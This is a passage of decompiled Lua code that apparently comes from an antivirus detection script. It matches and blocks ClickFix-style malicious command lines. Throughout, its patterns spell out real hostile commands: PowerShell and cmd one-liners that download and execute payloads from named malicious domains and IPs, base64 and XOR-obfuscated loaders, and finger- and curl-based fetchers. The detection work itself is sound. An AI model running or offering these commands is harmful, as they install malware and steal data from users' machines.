      L7_2 = ""
      L8_2 = ""
      do return L7_2, L8_2 end
      ::lbl_46::
      L7_2 = L5_2 + 1
      L3_2 = L2_2[L7_2]
      L5_2 = L5_2 + 2
    elseif L6_2 == "-outfile" or L6_2 == "-o" then
      if L4_2 == "" then
        L7_2 = L5_2 + 1
        L7_2 = L2_2[L7_2]
        if L7_2 ~= nil then
          goto lbl_63
        end
      end
      L7_2 = ""
      L8_2 = ""
      do return L7_2, L8_2 end
      ::lbl_63::
      L7_2 = L5_2 + 1
      L4_2 = L2_2[L7_2]
      L5_2 = L5_2 + 2
    elseif L6_2 == "-usebasicparsing" or L6_2 == "-useb" then
      L5_2 = L5_2 + 1
    else
      if L3_2 == "" then
        L7_2 = string
        L7_2 = L7_2.sub
        L8_2 = L6_2
        L9_2 = 1
        L10_2 = 1
        L7_2 = L7_2(L8_2, L9_2, L10_2)
        if L7_2 ~= "-" then
          L3_2 = L6_2
          L5_2 = L5_2 + 1
      end
      else
        L7_2 = ""
        L8_2 = ""
        return L7_2, L8_2
      end
    end
  end
  L6_2 = string
  L6_2 = L6_2.find
  L7_2 = L3_2
  L8_2 = "[%s$%%@]"
  L6_2 = L6_2(L7_2, L8_2)
  if L6_2 then
    L6_2 = ""
    L7_2 = ""
    return L6_2, L7_2
  end
  L6_2 = L3_2
  L7_2 = L4_2
  return L6_2, L7_2
end

function L27_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2
  L1_2 = string
  L1_2 = L1_2.match
  L2_2 = A0_2
  L3_2 = "^https?://([^/]+)"
  L1_2 = L1_2(L2_2, L3_2)
  if L1_2 == nil then
    L2_2 = false
    return L2_2
  end
  L2_2 = string
  L2_2 = L2_2.match
  L3_2 = L1_2
  L4_2 = "^([^:]+):(%d+)$"
  L2_2, L3_2 = L2_2(L3_2, L4_2)
  if L2_2 then
    L4_2 = #L3_2
    if not (5 < L4_2) then
      L4_2 = tonumber
      L5_2 = L3_2
      L4_2 = L4_2(L5_2)
      if not (L4_2 < 1) then
        L4_2 = tonumber
        L5_2 = L3_2
        L4_2 = L4_2(L5_2)
      end
    end
    if 65535 < L4_2 then
      L4_2 = false
      return L4_2
    end
  else
    L2_2 = L1_2
  end
  L4_2 = string
  L4_2 = L4_2.match
  L5_2 = L2_2
  L6_2 = "^(%d+)%.(%d+)%.(%d+)%.(%d+)$"
  L4_2, L5_2, L6_2, L7_2 = L4_2(L5_2, L6_2)
  if L4_2 == nil then
    L8_2 = false
    return L8_2
  end
  L8_2 = ipairs
  L9_2 = {}
  L10_2 = L4_2
  L11_2 = L5_2
  L12_2 = L6_2
  L13_2 = L7_2
  L9_2[1] = L10_2
  L9_2[2] = L11_2
  L9_2[3] = L12_2
  L9_2[4] = L13_2
  L8_2, L9_2, L10_2 = L8_2(L9_2)
  for L11_2, L12_2 in L8_2, L9_2, L10_2 do
    L13_2 = #L12_2
    if not (3 < L13_2) then
      L13_2 = tonumber
      L14_2 = L12_2
      L13_2 = L13_2(L14_2)
      if not (255 < L13_2) then
        goto lbl_62
      end
    end
    L13_2 = false
    do return L13_2 end
    ::lbl_62::
  end
  L8_2 = tonumber
  L9_2 = L4_2
  L8_2 = L8_2(L9_2)
  L9_2 = tonumber
  L10_2 = L5_2
  L9_2 = L9_2(L10_2)
  L5_2 = L9_2
  L4_2 = L8_2
  if L4_2 == 0 or L4_2 == 10 or L4_2 == 127 or L4_2 == 169 and L5_2 == 254 or L4_2 == 172 and 16 <= L5_2 and L5_2 <= 31 or L4_2 == 192 and L5_2 == 168 then
    L8_2 = false
    return L8_2
  end
  L8_2 = true
  return L8_2
end

function L28_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2
  L1_2 = {}
  L2_2 = "^forminsting%.rainbowpride%.online%?read=%x+$"
  L3_2 = "^https://checkvbrowsenterprise%.com/std%?sid=%d+%-[%w]+$"
  L4_2 = "^https://checkvbrowsenterprise%.com/my%?sid=%d+%-[%w]+$"
  L5_2 = "^https://btorsercoyt31%.cc/ps/traffic%?r=%x+$"
  L6_2 = "^https://zurggoyttjof21%.cc/ps/traffic%?r=%x+$"
  L7_2 = "^http://94%.26%.41%.2/c2f/e/%x+$"
  L8_2 = "^https://prestigeclient%.vip/downloads/t%.php$"
  L9_2 = "^https://t%-trustrest%.com/hex/01zmhvk5zb$"
  L1_2[1] = L2_2
  L1_2[2] = L3_2
  L1_2[3] = L4_2
  L1_2[4] = L5_2
  L1_2[5] = L6_2
  L1_2[6] = L7_2
  L1_2[7] = L8_2
  L1_2[8] = L9_2
  L2_2 = ipairs
  L3_2 = L1_2
  L2_2, L3_2, L4_2 = L2_2(L3_2)
  for L5_2, L6_2 in L2_2, L3_2, L4_2 do
    L7_2 = string
    L7_2 = L7_2.match
    L8_2 = A0_2
    L9_2 = L6_2
    L7_2 = L7_2(L8_2, L9_2)
    if L7_2 then
      L7_2 = true
      return L7_2
    end
  end
  L2_2 = {}
  L3_2 = "7f2-9258-b51be186721f/2fa-45f2-addc-a526708816c4/59c-46c4-a25f-bc1dbc019580"
  L4_2 = "608-b8d3-712fc1654e/849-b650-bc87849c3/e2-3db382c919e9"
  L5_2 = "sdf4563jvn/b7c13ff9c733/b77d-16f9f9d0817c"
  L6_2 = "sdf4563jvn/3da73b1-6095-4331-8022-91cefd563/83-bd88-5d51a2dc"
  L7_2 = "renf4y77/4e56-a2a2-ce9a5cf67d5c/fc-e2-1e-8c-32-20"
  L8_2 = "jkdjkjg374/ff0b-470c-9d0e-1803faafd547/620-510a53158475"
  L9_2 = "sdf4563jvn/b7c13ff9c733/a379-7d798caac5a5"
  L10_2 = "grog1274/1454-4a7c-84ac-02ff36a2d187/41ee-8212-1858fcc9"
  L2_2[1] = L3_2
  L2_2[2] = L4_2
  L2_2[3] = L5_2
  L2_2[4] = L6_2
  L2_2[5] = L7_2
  L2_2[6] = L8_2
  L2_2[7] = L9_2
  L2_2[8] = L10_2
  L3_2 = string
  L3_2 = L3_2.match
  L4_2 = A0_2
  L5_2 = "^fastly%.jsdelivr%.net/gh/(.+)$"
  L3_2 = L3_2(L4_2, L5_2)
  if not L3_2 then
    L3_2 = string
    L3_2 = L3_2.match
    L4_2 = A0_2
    L5_2 = "^cdn%.jsdelivr%.net/gh/(.+)$"
    L3_2 = L3_2(L4_2, L5_2)
  end
  L4_2 = ipairs
  L5_2 = L2_2
  L4_2, L5_2, L6_2 = L4_2(L5_2)
  for L7_2, L8_2 in L4_2, L5_2, L6_2 do
    if L3_2 == L8_2 then
      L9_2 = true
      return L9_2
    end
  end
  L4_2 = false
  return L4_2
end

function L29_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  L1_2 = string
  L1_2 = L1_2.match
  L2_2 = A0_2
  L3_2 = "^%((.-)%)%s*|%s*iex%s*$"
  L1_2 = L1_2(L2_2, L3_2)
  if L1_2 == nil then
    L2_2 = false
    return L2_2
  end
  L2_2 = string
  L2_2 = L2_2.gsub
  L3_2 = L1_2
  L4_2 = " %-timeoutsec 45$"
  L5_2 = ""
  L2_2 = L2_2(L3_2, L4_2, L5_2)
  L1_2 = L2_2
  L2_2 = string
  L2_2 = L2_2.match
  L3_2 = L1_2
  L4_2 = "^irm '([^']+)' %-useragent 'wua/(%x+)' %-headers @{'x%-wua'='(%x+)'}$"
  L2_2, L3_2, L4_2 = L2_2(L3_2, L4_2)
  if L2_2 ~= nil then
    L5_2 = #L3_2
    if L5_2 == 10 and L3_2 == L4_2 then
      goto lbl_31
    end
  end
  L5_2 = false
  do return L5_2 end
  ::lbl_31::
  L5_2 = string
  L5_2 = L5_2.match
  L6_2 = L2_2
  L7_2 = "^https?://([^/]+)/([%w_]+)/(%x+)$"
  L5_2, L6_2, L7_2 = L5_2(L6_2, L7_2)
  if L5_2 ~= nil then
    L8_2 = #L7_2
    if L8_2 == 16 then
      goto lbl_43
    end
  end
  L8_2 = false
  do return L8_2 end
  ::lbl_43::
  L8_2 = {}
  if L5_2 == "hagosuro.lc" then
    L9_2 = {}
    L9_2.dantestraff18 = true
    L9_2.verify = true
    L9_2.cloudflare = true
    L9_2.captchasolve = true
    L9_2["02"] = true
    L9_2.clickfix = true
    L9_2.lom3 = true
    L9_2.wordpresscheck = true
    L9_2.wp = true
    L8_2 = L9_2
  elseif L5_2 == "t-trustrest.com" then
    L9_2 = {}
    L9_2.ae8ouxb9gx = true
    L9_2.proliv2929 = true
    L9_2.dan_proliv = true
    L9_2.kdh = true
    L9_2.govnologi = true
    L9_2.girya = true
    L9_2.rift = true
    L9_2.adobefk = true
    L9_2.al1ps = true
    L8_2 = L9_2
  end
  L9_2 = L8_2[L6_2]
  L9_2 = L9_2 == true
  return L9_2
end

function L30_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2, L20_2, L21_2, L22_2, L23_2, L24_2, L25_2, L26_2, L27_2, L28_2, L29_2, L30_2, L31_2
  L2_2 = string
  L2_2 = L2_2.match
  L3_2 = A1_2
  L4_2 = "^%%comspec%% "
  L2_2 = L2_2(L3_2, L4_2)
  if not L2_2 then
    L2_2 = string
    L2_2 = L2_2.match
    L3_2 = A1_2
    L4_2 = "^cmd "
    L2_2 = L2_2(L3_2, L4_2)
    if not L2_2 then
      L2_2 = string
      L2_2 = L2_2.match
      L3_2 = A1_2
      L4_2 = "^conhost%.exe "
      L2_2 = L2_2(L3_2, L4_2)
      if not L2_2 then
        L2_2 = false
        return L2_2
      end
    end
  end
  L2_2 = string
  L2_2 = L2_2.find
  L3_2 = A0_2
  L4_2 = "%%[A-Z][^%w_]"
  L2_2 = L2_2(L3_2, L4_2)
  if not L2_2 then
    L2_2 = string
    L2_2 = L2_2.find
    L3_2 = A0_2
    L4_2 = "%%[A-Z]$"
    L2_2 = L2_2(L3_2, L4_2)
    if not L2_2 then
      goto lbl_40
    end
  end
  L2_2 = false
  do return L2_2 end
  ::lbl_40::
  L2_2 = string
  L2_2 = L2_2.match
  L3_2 = A1_2
  L4_2 = "^cmd /c echo captchaverification#%x+ && powershell %-nop %-w h %-c \"%$u='https://tmpfiles%.org/dl/1793153179%.e228689a0ba66b5c/w4aklqucftwn/cch%.exe';%$f=%$env:temp%+'\\cch%.exe';irm %$u %-outfile %$f;start%-process %$f\" && echo verified$"
  L2_2 = L2_2(L3_2, L4_2)
  if L2_2 then
    L2_2 = true
    return L2_2
  end
  L2_2 = string
  L2_2 = L2_2.match
  L3_2 = A1_2
  L4_2 = "^conhost%.exe %-%-headless %-%-inheritcursor %-%-width 80 %-%-height 30 %-%- cmd /v:on /c \"set a=pu&set b=shd&set c=run&set d=dll32&for %%x in %(!a!!b!%) do @%%x hcwjcope%.poundbahis%.com@ssl@443(.-)f679d78%-ec48%-498c%-89f3%-d5b024edd1a3 & !c!!d! goog%.ct,#1\"$"
  L2_2 = L2_2(L3_2, L4_2)
  if L2_2 == "&#x0c;" or L2_2 == "\f" or L2_2 == "\\" then
    L3_2 = true
    return L3_2
  end
  L3_2 = string
  L3_2 = L3_2.match
  L4_2 = A1_2
  L5_2 = "^%%comspec%%%s+/m%^%^i%^n /c%s+\"%%comspec%% /c start \"\"%s+for /f \"delims=@\" %%([a-z]) in\" %(',f%^%^i%^%^n%^%^g%^%^e%^%^r ([%w%^]+@[%w.%-]+)'%) do %%([a-z])%s*&?%s*$"
  L3_2, L4_2, L5_2 = L3_2(L4_2, L5_2)
  if L3_2 and L3_2 == L5_2 then
    L6_2 = string
    L6_2 = L6_2.find
    L7_2 = L4_2
    L8_2 = "."
    L9_2 = 1
    L10_2 = true
    L6_2 = L6_2(L7_2, L8_2, L9_2, L10_2)
    if L6_2 then
      L6_2 = true
      return L6_2
    end
  end
  L6_2 = A1_2
  L7_2 = 1
  L8_2 = 8
  L9_2 = 1
  for L10_2 = L7_2, L8_2, L9_2 do
    L11_2 = string
    L11_2 = L11_2.match
    L12_2 = L6_2
    L13_2 = "^%%comspec%% /c (.+)$"
    L11_2 = L11_2(L12_2, L13_2)
    if not L11_2 then
      L11_2 = string
      L11_2 = L11_2.match
      L12_2 = L6_2
      L13_2 = "^%%comspec%% /v:on /c (.+)$"
      L11_2 = L11_2(L12_2, L13_2)
      if not L11_2 then
        L11_2 = string
        L11_2 = L11_2.match
        L12_2 = L6_2
        L13_2 = "^cmd /v:on /c (.+)$"
        L11_2 = L11_2(L12_2, L13_2)
        if not L11_2 then
          L11_2 = string
          L11_2 = L11_2.match
          L12_2 = L6_2
          L13_2 = "^cmd /c (.+)$"
          L11_2 = L11_2(L12_2, L13_2)
        end
      end
    end
    if L11_2 then
      L6_2 = L11_2
    else
      L12_2 = string
      L12_2 = L12_2.match
      L13_2 = L6_2
      L14_2 = "^start \"\" ([/%a%^]+) (.+)$"
      L12_2, L13_2 = L12_2(L13_2, L14_2)
      if L12_2 == nil then
        break
      end
      L14_2 = string
      L14_2 = L14_2.gsub
      L15_2 = L12_2
      L16_2 = "%^"
      L17_2 = ""
      L14_2 = L14_2(L15_2, L16_2, L17_2)
      L12_2 = L14_2
      if L12_2 ~= "/min" and L12_2 ~= "/max" then
        L14_2 = false
        return L14_2
      end
      L6_2 = L13_2
    end
  end
  L7_2 = string
  L7_2 = L7_2.match
  L8_2 = L6_2
  L9_2 = "^\"set ([a-z])=min && %%comspec%% /c start \"\" /%%%1%% (for /f .-)\"%s+&.*$"
  L7_2, L8_2 = L7_2(L8_2, L9_2)
  if L7_2 then
    L6_2 = L8_2
  end
  L9_2 = string
  L9_2 = L9_2.match
  L10_2 = L6_2
  L11_2 = "^for /f \"delims=@?\" %%([a-z]) in %(',+f%^%^i%^%^n%^%^g%^%^e%^%^r ([%w%^]+@[%w.%^%-]+)'%) do %%([a-z])(.*)$"
  L9_2, L10_2, L11_2, L12_2 = L9_2(L10_2, L11_2)
  if L9_2 and L9_2 == L11_2 then
    L13_2 = string
    L13_2 = L13_2.find
    L14_2 = L10_2
    L15_2 = "."
    L16_2 = 1
    L17_2 = true
    L13_2 = L13_2(L14_2, L15_2, L16_2, L17_2)
    if L13_2 then
      if L12_2 ~= "" then
        L13_2 = string
        L13_2 = L13_2.match
        L14_2 = L12_2
        L15_2 = "^%s+&"
        L13_2 = L13_2(L14_2, L15_2)
        if not L13_2 then
          goto lbl_177
        end
      end
      L13_2 = true
      return L13_2
    end
  end
  ::lbl_177::
  L13_2 = string
  L13_2 = L13_2.match
  L14_2 = L6_2
  L15_2 = "^for /f (.-)%%([a-z]) in %('where ([%a%*, ]+)'%) do for /f \"delims=\" %%([a-z]) in %('\"%%([a-z])\" ([%w_.%-]+@[%w_.%^%-]+)'%) do @%%([a-z])(.*)$"
  L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2, L20_2 = L13_2(L14_2, L15_2)
  if (L13_2 == "" or L13_2 == "\"delims=\" ") and L14_2 == L17_2 and L16_2 == L19_2 and L14_2 ~= L16_2 then
    L21_2 = string
    L21_2 = L21_2.gsub
    L22_2 = L15_2
    L23_2 = ","
    L24_2 = ""
    L21_2 = L21_2(L22_2, L23_2, L24_2)
    L15_2 = L21_2
    if L15_2 == "f*n*er" or L15_2 == "finger" then
      L21_2 = string
      L21_2 = L21_2.find
      L22_2 = L18_2
      L23_2 = "."
      L24_2 = 1
      L25_2 = true
      L21_2 = L21_2(L22_2, L23_2, L24_2, L25_2)
      if L21_2 then
        if L20_2 ~= "" then
          L21_2 = string
          L21_2 = L21_2.match
          L22_2 = L20_2
          L23_2 = "^%s+&"
          L21_2 = L21_2(L22_2, L23_2)
          if not L21_2 then
            goto lbl_223
          end
        end
        L21_2 = true
        return L21_2
      end
    end
  end
  ::lbl_223::
  L21_2 = string
  L21_2 = L21_2.match
  L22_2 = L6_2
  L23_2 = "^\"%(%s*set x=cu&set c=rl&for %%([a-z]) in %((%%localappdata%%\\[%w_%-]+%.hta)%) do !x!!c! %-sklo \"%%([a-z])\" ([%w.%-]+/fop)& start \"\" \"%%([a-z])\"%)\"(.*)$"
  L21_2, L22_2, L23_2, L24_2, L25_2, L26_2 = L21_2(L22_2, L23_2)
  if L21_2 and L22_2 and L21_2 == L23_2 and L21_2 == L25_2 and (L24_2 == "nessandgneiss.com/fop" or L24_2 == "nazeandgabbro.com/fop") then
    if L26_2 ~= "" then
      L27_2 = string
      L27_2 = L27_2.match
      L28_2 = L26_2
      L29_2 = "^%s+& rem%s"
      L27_2 = L27_2(L28_2, L29_2)
      if not L27_2 then
        goto lbl_251
      end
    end
    L27_2 = true
    return L27_2
  end
  ::lbl_251::
  L27_2 = "\"set qp=pow&set prpo=ershe&set byi=ll &set sil=-noprofile -command \"\"$progresspreference='silentlycontinue'; i'w'r '0x90ac55f4/865' -outfile ($env:temp+'\\865.msi') -usebasicparsing\"\" &call !qp!!prpo!!byi!!sil!\" && cmd /v:on /c \"set htn=msiexec.exe /i !temp!\\865.msi /qn /norestart&for %f in (1) do call !htn!\""
  L28_2 = L6_2 == L27_2
  return L28_2
end

function L31_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  L1_2 = string
  L1_2 = L1_2.match
  L2_2 = A0_2
  L3_2 = "^%$([%a_][%w_]*)='(https?://[%w%./%-]+)';%$%1 = %$%1%.replace%('([%a]+)', ''%);%$([%a_][%w_]*)='';try {%$%4=irm %(%$%1%);}catch{%$%4=curl%.exe %-s %-l %$%1|out%-string;}%$%4=%$%4%.replace%('%[key%]', '[%w]+'%);iex %$%4;$"
  L1_2, L2_2, L3_2, L4_2 = L1_2(L2_2, L3_2)
  if L1_2 and L1_2 ~= L4_2 then
    L5_2 = #L3_2
    if 8 <= L5_2 then
      L5_2 = string
      L5_2 = L5_2.find
      L6_2 = L2_2
      L7_2 = L3_2
      L8_2 = 1
      L9_2 = true
      L5_2 = L5_2(L6_2, L7_2, L8_2, L9_2)
      if L5_2 then
        L5_2 = true
        return L5_2
      end
    end
  end
  L5_2 = string
  L5_2 = L5_2.match
  L6_2 = A0_2
  L7_2 = "^%$k=%[convert%]::frombase64string%('[a-z0-9+/=]+'%);function d%(%$s%){%$b=%[convert%]::frombase64string%(%$s%);for%(%$i=0;%$i %-lt %$b%.length;%$i%+%+%){%$b%[%$i%]=%$b%[%$i%] %-bxor %$k%[%$i %% %$k%.length%]};%[text%.encoding%]::utf8%.getstring%(%$b%)};%$u=d '[a-z0-9+/=]+';%$t=d '[a-z0-9+/=]+';%$a=%[reflection%.assembly%]::load%(%(new%-object net%.webclient%)%.downloaddata%(%$u%)%);%$a%.entrypoint%.invoke%(%$null,%[object%[%]%]%@%(,%[string%[%]%]%@%(%$t%)%)%)$"
  L5_2 = L5_2(L6_2, L7_2)
  if L5_2 then
    L5_2 = true
    return L5_2
  end
  L5_2 = A0_2 == ".((write ie)+'zx'[1])(irm 87.251.69.209/2.txt)"
  return L5_2
end

function L32_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2
  L3_2 = {}
  L4_2 = "^powershell \"iex %(%[system%.text%.encoding%]::utf8%.getstring%(%[convert%]::frombase64string%('()[%w+/=]+()'%)%)%)\"$"
  L5_2 = "^powershell %-w h %-encodedcommand ()[%w+/=]+()$"
  L6_2 = "^pwsh %-noprofile %-executionpolicy bypass %-encodedcommand ()[%w+/=]+() & exit$"
  L7_2 = "^powershell %-wi mi %$z='()[%w+/=]+()';powershell %-e %$z;valid query n#[%w]+$"
  L3_2[1] = L4_2
  L3_2[2] = L5_2
  L3_2[3] = L6_2
  L3_2[4] = L7_2
  L4_2 = ipairs
  L5_2 = L3_2
  L4_2, L5_2, L6_2 = L4_2(L5_2)
  for L7_2, L8_2 in L4_2, L5_2, L6_2 do
    L9_2 = string
    L9_2 = L9_2.match
    L10_2 = A1_2
    L11_2 = L8_2
    L9_2, L10_2 = L9_2(L10_2, L11_2)
    if L9_2 then
      L11_2 = string
      L11_2 = L11_2.sub
      L12_2 = A0_2
      L13_2 = L9_2
      L14_2 = L10_2 - 1
      L11_2 = L11_2(L12_2, L13_2, L14_2)
      L12_2 = #L11_2
      if not (4096 < L12_2) then
        L12_2 = #L11_2
        L12_2 = L12_2 % 4
        if L12_2 == 0 then
          goto lbl_33
        end
      end
      L12_2 = false
      do return L12_2 end
      ::lbl_33::
      L12_2 = MpCommon
      L12_2 = L12_2.Base64Decode
      L13_2 = L11_2
      L12_2 = L12_2(L13_2)
      L13_2 = type
      L14_2 = L12_2
      L13_2 = L13_2(L14_2)
      if L13_2 == "string" then
        L13_2 = #L12_2
        if not (3072 < L13_2) then
          goto lbl_47
        end
      end
      L13_2 = false
      do return L13_2 end
      ::lbl_47::
      if L7_2 ~= 1 then
        L13_2 = #L12_2
        L13_2 = L13_2 % 2
        if L13_2 ~= 0 then
          L13_2 = false
          return L13_2
        end
        L13_2 = mp
        L13_2 = L13_2.utf16to8
        L14_2 = L12_2
        L15_2 = "\000\000"
        L14_2 = L14_2 .. L15_2
        L13_2 = L13_2(L14_2)
        L12_2 = L13_2
        L13_2 = type
        L14_2 = L12_2
        L13_2 = L13_2(L14_2)
        if L13_2 ~= "string" then
          L13_2 = false
          return L13_2
        end
      end
      L13_2 = L31_1
      L14_2 = string
      L14_2 = L14_2.lower
      L15_2 = L12_2
      L14_2, L15_2 = L14_2(L15_2)
      return L13_2(L14_2, L15_2)
    end
  end
  if A2_2 then
    L4_2 = false
    return L4_2
  end
  L4_2 = string
  L4_2 = L4_2.match
  L5_2 = A1_2
  L6_2 = "^iex%(iwr %(%[system%.text%.encoding%]::utf8%.getstring%(%[convert%]::frombase64string%('()[%w+/=]+()'%)%)%) %-usebasicparsing%)$"
  L4_2, L5_2 = L4_2(L5_2, L6_2)
  if L4_2 ~= nil then
    L6_2 = L5_2 - L4_2
    if not (1024 < L6_2) then
      goto lbl_94
    end
  end
  L6_2 = false
  do return L6_2 end
  ::lbl_94::
  L6_2 = MpCommon
  L6_2 = L6_2.Base64Decode
  L7_2 = string
  L7_2 = L7_2.sub
  L8_2 = A0_2
  L9_2 = L4_2
  L10_2 = L5_2 - 1
  L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2 = L7_2(L8_2, L9_2, L10_2)
  L6_2 = L6_2(L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2)
  L7_2 = type
  L8_2 = L6_2
  L7_2 = L7_2(L8_2)
  L7_2 = L7_2 == "string"
  return L7_2
end

function L33_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2
  L1_2 = {}
  L2_2 = "^%$f=%$env:temp%+'\\kefac%.ps1';curl%.exe %-sk %-o %$f 'https://bingixllc%.com/[%w]+';powershell %-ep bypass %-file %$f$"
  L3_2 = "^%$f=%$env:temp%+'\\kefac%.ps1';curl%.exe %-sk %-o %$f 'https://bingixllc%.com/[%w]+';%[void%]%[diagnostics%.process%]::start%('powershell','%-nop %-w hidden %-ep bypass %-file '%+%[char%]34%+%$f%+%[char%]34%)$"
  L4_2 = "^iwr https://wlci%.ink/i%?tag=[%w]+ %-usebasicparsing %-o %$env:temp\\c%.ps1;%. %$env:temp\\c%.ps1$"
  L5_2 = "^iwr https://wlci%.ink/qwin%?tag=fbremdesk %-outfile %$env:temp\\i%.ps1; unblock%-file %$env:temp\\i%.ps1; &%$env:temp\\i%.ps1$"
  L6_2 = "^%$o='{0}xml2%.{1}mlhttp'%-f'ms','x';%$x=new%-object %-com %$o;%$x%.open%('get','https://audiosdkteams%.com/s[24]',0%);%$x%.send%(%);%$x%.responsetext|out%-file %$env:tmp\\x%.ps1;iex%(gc %$env:tmp\\x%.ps1 %-raw%);rm %$env:tmp\\x%.ps1$"
  L7_2 = "^iex%(%(new%-object net%.webclient%)%.downloadstring%('https://love%.district7pho%.com/pidor%.ps1'%)%)%s*#"
  L1_2[1] = L2_2
  L1_2[2] = L3_2
  L1_2[3] = L4_2
  L1_2[4] = L5_2
  L1_2[5] = L6_2
  L1_2[6] = L7_2
  L2_2 = ipairs
  L3_2 = L1_2
  L2_2, L3_2, L4_2 = L2_2(L3_2)
  for L5_2, L6_2 in L2_2, L3_2, L4_2 do
    L7_2 = string
    L7_2 = L7_2.match
    L8_2 = A0_2
    L9_2 = L6_2
    L7_2 = L7_2(L8_2, L9_2)
    if L7_2 then
      L7_2 = true
      return L7_2
    end
  end
  L2_2 = A0_2 == "$z='seccheckusr.com';@(0)|&([char]37){'jq38k'}|&([char]37){&([scriptblock]::create($(@(0)|&([char]37){&('{0}{1}{2}'-f'invo','ke-','restmethod') $z}|&('select'+'-'+'object') -f 1)))}" or A0_2 == "[net.servicepointmanager]::securityprotocol=[net.securityprotocoltype]::tls12; [reflection.assembly]::load((invoke-webrequest 'https://prestigeclient.vip/downloads/r.php' -usebasicparsing).content).entrypoint.invoke($null,@(,[string[]]@())) | out-null #password"
  return L2_2
end

function L34_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2, L10_2, L11_2, L12_2, L13_2, L14_2, L15_2, L16_2, L17_2, L18_2, L19_2, L20_2, L21_2, L22_2, L23_2, L24_2, L25_2
  L2_2 = type
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  if L2_2 == "string" then
    L2_2 = #A0_2
    if not (L2_2 < 16) then
      L2_2 = #A0_2
      if not (8192 < L2_2) then
        goto lbl_14
      end
    end
  end
  L2_2 = ""
  do return L2_2 end
  ::lbl_14::
  L2_2 = string
  L2_2 = L2_2.find
  L3_2 = A0_2
  L4_2 = "[%z\r\n]"
  L2_2 = L2_2(L3_2, L4_2)
  if L2_2 then
    L2_2 = ""
    return L2_2
  end
  L2_2 = L23_1
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  A0_2 = L2_2
  L2_2 = string
  L2_2 = L2_2.lower
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  L3_2 = L30_1
  L4_2 = A0_2
  L5_2 = L2_2
  L3_2 = L3_2(L4_2, L5_2)
  if not L3_2 then
    L3_2 = L32_1
    L4_2 = A0_2
    L5_2 = L2_2
    L6_2 = A1_2
    L3_2 = L3_2(L4_2, L5_2, L6_2)
    if not L3_2 then
      goto lbl_46
    end
  end
  L3_2 = "block"
  do return L3_2 end
  ::lbl_46::
  if L2_2 ~= "powershell -w h /c \"gci \\\"$env:localappdata\\\" -r -filter 'f_*'|? length -eq 23751|foreach{ $a=$_.fullname}; wscript.exe //e:vbs $a\"                                                    complete verification steps" then
    L3_2 = string
    L3_2 = L3_2.match
    L4_2 = L2_2
    L5_2 = "^powershell %-w hidden /c \"gci \\\"%$env:localappdata\\\" %-r %-filter 'f_%*'|%?{%$_%.length %-eq 21919}|foreach{wscript%.exe //e:vbs %$_%.fullname}\"#%s*complete verification steps$"
    L3_2 = L3_2(L4_2, L5_2)
    if not L3_2 then
      goto lbl_57
    end
  end
  L3_2 = "block"
  do return L3_2 end
  ::lbl_57::
  L3_2 = string
  L3_2 = L3_2.match
  L4_2 = L2_2
  L5_2 = "^cmd /d /q /c for /r \"%%localappdata%%\\([^\"]+)\" %%([a-z]) in %(f_%*%) do @if %%~z([a-z])==%d+ ren \"%%([a-z])\" ([%w_%-]+%.vbs) & wscript \"%%~dp([a-z])\\([%w_%-]+%.vbs)\"$"
  L3_2, L4_2, L5_2, L6_2, L7_2, L8_2, L9_2 = L3_2(L4_2, L5_2)
  L10_2 = {}
  L11_2 = "google\\chrome\\user data"
  L12_2 = "microsoft\\edge\\user data"
  L13_2 = "mozilla\\firefox\\profiles"
  L14_2 = "opera software\\opera stable"
  L10_2[1] = L11_2
  L10_2[2] = L12_2
  L10_2[3] = L13_2
  L10_2[4] = L14_2
  if L3_2 and L4_2 == L5_2 and L4_2 == L6_2 and L4_2 == L8_2 and L7_2 == L9_2 then
    L11_2 = ipairs
    L12_2 = L10_2
    L11_2, L12_2, L13_2 = L11_2(L12_2)
    for L14_2, L15_2 in L11_2, L12_2, L13_2 do
      if L3_2 == L15_2 then
        L16_2 = "lowfi"
        return L16_2
      end
    end
  end
  L11_2 = L24_1
  L12_2 = L2_2
  L13_2 = A1_2
  L11_2 = L11_2(L12_2, L13_2)
  if L11_2 == "" then
    L12_2 = ""
    return L12_2
  end
  L12_2 = string
  L12_2 = L12_2.match
  L13_2 = L11_2
  L14_2 = "^ls %$env:localappdata\\google\\chrome\\'user data'\\default\\cache\\cache_data\\f_%*|%?{%$_%.length%-eq%d+}|%%{iex%(sls 'ssembly' %$_%)%.line}$"
  L12_2 = L12_2(L13_2, L14_2)
  if L12_2 then
    L12_2 = "lowfi"
    return L12_2
  end
  L12_2 = L29_1
  L13_2 = L11_2
  L12_2 = L12_2(L13_2)
  if not L12_2 then
    L12_2 = L33_1
    L13_2 = L11_2
    L12_2 = L12_2(L13_2)
    if not L12_2 then
      L12_2 = L31_1
      L13_2 = L11_2
      L12_2 = L12_2(L13_2)
      if not L12_2 then
        goto lbl_122
      end
    end
  end
  L12_2 = "block"
  do return L12_2 end
  ::lbl_122::
  L12_2 = string
  L12_2 = L12_2.match
  L13_2 = L11_2
  L14_2 = "^(.-)%s*|%s*([%a%-]+)%s*$"
  L12_2, L13_2 = L12_2(L13_2, L14_2)
  if L13_2 ~= "iex" and L13_2 ~= "invoke-expression" then
    L14_2 = string
    L14_2 = L14_2.match
    L15_2 = L11_2
